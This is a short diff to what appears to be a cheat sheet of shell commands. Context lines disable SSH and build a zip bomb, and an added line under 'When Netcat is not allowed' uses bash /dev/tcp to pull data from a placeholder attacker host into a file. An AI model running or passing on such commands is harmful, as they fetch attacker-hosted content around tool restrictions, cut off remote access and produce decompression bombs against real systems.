@@ -212,3 +212,5 @@ systemctl disable ssh
 dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
 ```
 
+# When Netcat is not allowed:
+```bash -c 'cat < /dev/tcp/<atkIP>/8080' > cthulhu.txt```
